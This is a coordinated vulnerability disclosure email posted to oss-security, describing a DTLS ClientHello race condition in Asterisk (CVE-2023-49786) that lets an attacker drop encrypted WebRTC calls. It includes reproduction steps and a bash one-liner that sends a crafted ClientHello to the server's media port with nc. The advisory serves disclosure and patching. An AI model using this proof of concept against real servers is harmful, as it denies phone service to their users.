Received: (qmail 5888 invoked by uid 550); 15 Dec 2023 12:36:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30488 invoked from network); 15 Dec 2023 12:27:14 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	enablesecurity.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:from:from:in-reply-to:message-id
	:mime-version:reply-to:subject:subject:to:to; s=fm3; t=
	1702643247; x=1702729647; bh=Ts4S6gmJl18iI5BMWYwSfQd/Lyk4tvjPire
	FXKdziHo=; b=krWql7iyYOFNiZc4dR0DvqKZdg7bBxQchdB+2L4NU3Fp7Pt22hd
	8YhwmREGU5ZtMQfenY/h4D5NON5eqElU9BtSGo/TIJCSULbYJ4YXq9O5+mje1pjm
	0u3mSzEbO7DyX2XKxU0E7VSt2rpFKZ8ViRSamSBtl2o/qvKz+C9ns2BSxlnLNv8c
	QAYRHO/vO86/Enp7sFmtphRxxHcrlB33Jd4/KrixgP61xc0RToaBB9w6sv1e9zyq
	LvME9r8Qivcj7ANDaK5fwlMBGcH5+nP9wMMSaJuqfrekap9PmhsPOaWHjRjXb7KY
	0bMz6csLOu+YV2l0a2/NhO/7WBpiWg1uH3g==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
	messagingengine.com; h=cc:content-transfer-encoding:content-type
	:content-type:date:date:feedback-id:feedback-id:from:from
	:in-reply-to:message-id:mime-version:reply-to:subject:subject:to
	:to:x-me-proxy:x-me-proxy:x-me-sender:x-me-sender:x-sasl-enc; s=
	fm2; t=1702643247; x=1702729647; bh=Ts4S6gmJl18iI5BMWYwSfQd/Lyk4
	tvjPireFXKdziHo=; b=2GaMG27NWkS5piJ1WXksYW58MmSuy9uupfHtnSqBa22Z
	wQzK8XJkAPU4yZzQqUPaXz/ynZHJDmp8uq7vIMceS7bRi8FWJtRa7+o1vJnBjsp1
	C2jVfsazz9yQGg9GiHayjh9y54r167bOD7lktwaa4vlw0pvTpCIDldjU/ZXFD81U
	xaS/JPf2kz7rQ2zUj4cWdnpv0c6ZPQIJrqo2FqJN57zqtLTk+MeSZiiZmJH9UNkT
	Uf76/U578Wlhyf/AplwWCAvNw8IYkoxrdmUC8cOJEqZaA2VKSw3lQmgs3N++jaq6
	hlnNvEx80V94bopqPFryzRTY6M7bpEcZ/TduzMuZqA==
X-ME-Sender: <xms:LkZ8ZZAirRHAidvHzz2rrh6SjLoa8uP3KiPutjLRpNXdu4hpCVR3lQ>
    <xme:LkZ8ZXgzexjwQT7ZpW5DNotD3pn99jTD11-X7FyrZ_pzeOaqRz3SXin3D3jebF-b2
    FRkZJ93ruzyhjkJkA>
X-ME-Proxy-Cause: gggruggvucftvghtrhhoucdtuddrgedvkedrvddtvddggedtucetufdoteggodetrfdotf
    fvucfrrhhofhhilhgvmecuhfgrshhtofgrihhlpdfqfgfvpdfurfetoffkrfgpnffqhgen
    uceurghilhhouhhtmecufedttdenucenucfjughrpefofgggkfffhffvufgtgfesthhqre
    dtreerjeenucfhrhhomhepfdfurghnughrohcuifgruhgtihdfuceoshgrnhgurhhosegv
    nhgrsghlvghsvggtuhhrihhthidrtghomheqnecuggftrfgrthhtvghrnhepgfetheffge
    efkefgheduffdujeeviefgfedugeffheekudetffeftdetgfejtdfgnecuffhomhgrihhn
    pehgihhthhhusgdrtghomhdpvghnrggslhgvshgvtghurhhithihrdgtohhmpdhivghtfh
    drohhrghdprhhttghsvggtrdgtohhmnecuvehluhhsthgvrhfuihiivgeptdenucfrrghr
    rghmpehmrghilhhfrhhomhepshgrnhgurhhosegvnhgrsghlvghsvggtuhhrihhthidrtg
    homh
X-ME-Proxy: <xmx:LkZ8ZUkSs5Zuc7TRepzBHZZQ6QjBf-Fr2enrka4uJkVZ-YyED0eIHw>
    <xmx:LkZ8ZTzL23oR4nZNWlpA56UYlP85I1AMwaR4WLiVH7ISIGdBIf6vNg>
    <xmx:LkZ8ZeQ0wWcn_paDZ1G5qI4pIgokZBwURJJt5_MGEk44y_ehlkdTNw>
    <xmx:L0Z8ZUM_HCcJkOWQiP4-8otrT9NqTKGzR1-26QW7WV5nE2OLiYze0g>
Feedback-ID: if8634316:Fastmail
X-Mailer: MessagingEngine.com Webmail Interface
User-Agent: Cyrus-JMAP/3.9.0-alpha0-1283-g327e3ec917-fm-20231207.002-g327e3ec9
MIME-Version: 1.0
Message-Id: <0b192078-4f43-4dd1-adbb-215a258ef852@app.fastmail.com>
Date: Fri, 15 Dec 2023 13:27:06 +0100
From: "Sandro Gauci" <sandro@enablesecurity.com>
To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
 fulldisclosure@seclists.org, voipsec@voipsa.org,
 submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
Content-Type: text/plain;charset=utf-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] [ES2023-01] Asterisk susceptible to Denial of Service via DTLS Hello packets
 during call initiation

# Asterisk susceptible to Denial of Service via DTLS Hello packets during c=
all initiation

- Fixed versions: 18.20.1, 20.5.1, 21.0.1,18.9-cert6
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tr=
ee/master/ES2023-01-asterisk-dtls-hello-race
- Vendor Security Advisory: https://github.com/asterisk/asterisk/security/a=
dvisories/GHSA-hxj9-xwr8-w8pq
- Other references: CVE-2023-49786
- Tested vulnerable versions: 20.1.0
- Timeline:
	- Report date: 2023-09-27
	- Triaged: 2023-09-27
	- Fix provided for testing: 2023-11-09
	- Vendor release with fix: 2023-12-14
	- Enable Security advisory: 2023-12-15

## TL;DR

When handling DTLS-SRTP for media setup, Asterisk is susceptible to Denial =
of Service due to a race condition in the hello handshake phase of the DTLS=
 protocol. This attack can be done continuously, thus denying new DTLS-SRTP=
 encrypted calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transpor=
t Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[=
^1] is susceptible to a Denial of Service attack due to a race condition. I=
f an attacker manages to send a ClientHello DTLS message with an invalid Ci=
pherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the Asterisk s=
erver that is expecting packets from the caller, a DTLS error is generated.=
 This results in the media session being torn down, which is followed by te=
ardown at signaling (SIP) level too.

This behavior was tested against Asterisk version 20.1.0, which was found t=
o be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) invol=
ving SIP, STUN and DTLS messages between a UAC (the Caller) and an Asterisk=
 server capable of handling WebRTC calls.

Diagram showing a call setup against Asterisk that uses SIP, STUN and DTLS:=
 https://github.com/EnableSecurity/advisories/blob/master/ES2023-01-asteris=
k-dtls-hello-race/resources/valid.png

In a controlled experiment, it was observed that when the Attacker sent a D=
TLS ClientHello to Asterisk's media port from a different IP and port, Aste=
risk responded by sending a DTLS Alert to the Caller. Additionally, Asteris=
k terminated the SIP call by sending a BYE message to the Caller.

Diagram showing a call setup against Asterisk that fails due to an attacker=
 controlled DTLS ClientHello:
https://github.com/EnableSecurity/advisories/blob/master/ES2023-01-asterisk=
-dtls-hello-race/resources/dos.png

During a real attack, the attacker would spray a vulnerable Asterisk server=
 with DTLS ClientHello messages. The attacker would typically target the ra=
nge of UDP ports allocated for RTP. When the ClientHello message from the A=
ttacker wins the race against an expected ClientHello from the Caller, the =
call terminates, resulting in Denial of Service.

## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vuln=
erable Asterisk servers for calls that rely on DTLS-SRTP.

## How to reproduce the issue

1. Prepare an Asterisk server with an extension configured to handle WebRTC=
; this may involve the following `pjsip.conf` and `extensions.conf` configu=
ration updates:

    `pjsip.conf`
    ```ini
	[transport-tls-nat]
	type =3D transport
	protocol =3D wss
	bind =3D 172.17.0.2

	[webrtc_client]
	type=3Daor
	max_contacts=3D5
	remove_existing=3Dyes

	[webrtc_client]
	type=3Dauth
	auth_type=3Duserpass
	username=3D3456
	password=3D3456

	[3456]
	type=3Dendpoint
	aors=3Dwebrtc_client
	auth=3Dwebrtc_client
	dtls_auto_generate_cert=3Dyes
	webrtc=3Dyes
	context=3Ddefault
	disallow=3Dall
	allow=3Dopus,ulaw
	```

	`extensions.conf`
	```ini
	[globals]

	[default]
	exten =3D _XXXX,1,Verbose(1, "User ${CALLERID(num)} dialed ${EXTEN}.")
		same =3D> n,Playback(demo-congrats)
		same =3D> n,Hangup()
	```
1. Send an INVITE message to the target server with WebRTC SDP:

    ```default
	INVITE sip:1000@192.168.1.202 SIP/2.0
	Via: SIP/2.0/WSS 192.168.1.202:36742;rport=3D36742;branch=3Dz9hG4bK-4RHtim=
OzaIkHeUDU
	Max-Forwards: 70
	From: <sip:3456@192.168.1.202>;tag=3Dcnbsc3nNX2ydugl4
	To: <sip:1000@192.168.1.202>
	Contact: <sip:3456@192.168.1.202>
	Call-ID: VaglTzNRBSuvPPdw
	CSeq: 5 INVITE
	Content-Type: application/sdp
	Content-Length: 563

	v=3D0
	o=3D- 1695296401 1695296401 IN IP4 192.168.1.202
	s=3D-
	t=3D0 0
	c=3DIN IP4 192.168.1.202
	m=3Daudio 36866 UDP/TLS/RTP/SAVPF 0 8 101
	a=3Dsetup:active
	a=3Dfingerprint:sha-256 49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80=
:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
	a=3Drtpmap:0 PCMU/8000/1
	a=3Drtpmap:8 PCMA/8000/1
	a=3Drtpmap:101 telephone-event/8000
	a=3Dice-ufrag:IOZyOSQkVywevryI
	a=3Dice-pwd:UQUtRMZKFERnmZqQdaggFzJBhcWVxabr
	a=3Dcandidate:6249488300 1 udp 2130706431 192.168.1.202 36866 typ host gen=
eration 0
	a=3Dend-of-candidates
	a=3Drtcp-mux
	a=3Drtcprsize
	a=3Dsendrecv

	```
1. Note Asterisk's media port and IP values, which will be used as the `<as=
terisk-ip>` and `<media-port>` parameters by the Attacker
1. When the call has been established, send a STUN binding request which ha=
s the appropriate Username, Message-Integrity and  Ice-Controlled properties
1. When the Binding Success Response message is received, send a DTLS Clien=
tHello message from a (attacker-controlled) host, which is different from t=
he Caller but has network access to the Asterisk server

    ```bash
	CLIENT_HELLO=3D"Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA"=20
	CLIENT_HELLO=3D"${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
	CLIENT_HELLO=3D"${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
	CLIENT_HELLO=3D"${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
	CLIENT_HELLO=3D"${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA=3D"
	echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <asterisk-ip> <media-p=
ort>
	```
1. Observe that the Caller receives a DTLS Alert message and a SIP BYE mess=
age on its signaling channel

Note that the above steps are used to reliably reproduce the vulnerability.=
 In the case of a real attack, the attacker simply has to spray the Asteris=
k server with DTLS messages.


## Solution and recommendations

To address this vulnerability, upgrade Asterisk to the latest version which=
 includes the security fix. The solution implemented is to drop all packets=
 from addresses that have not been validated by an ICE check.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive securi=
ty tools and provides quality penetration testing to help protect your real=
-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of p=
ublishing based on currently available information. Use of the information =
constitutes acceptance for use in an AS IS condition. There are no warranti=
es with regard to this information. Neither the author nor the publisher ac=
cepts any liability for any direct, indirect, or consequential loss or dama=
ge arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy=
 which can be found at <https://github.com/EnableSecurity/Vulnerability-Dis=
closure-Policy>.

[^1]: Datagram Transport Layer Security (DTLS) Extension to Establish Keys =
for the Secure Real-time Transport Protocol (SRTP) https://datatracker.ietf=
.org/doc/html/rfc5764


--
=20
    Sandro Gauci, CEO at Enable Security GmbH

    Register of Companies:       AG Charlottenburg HRB 173016 B
    Company HQ:                       Neuburger Stra=C3=9Fe 101 b, 94036 Pa=
ssau, Germany
    RTCSec Newsletter:               https://www.rtcsec.com/subscribe
    Our blog:                                https://www.rtcsec.com
    Other points of contact:       https://www.enablesecurity.com/contact/
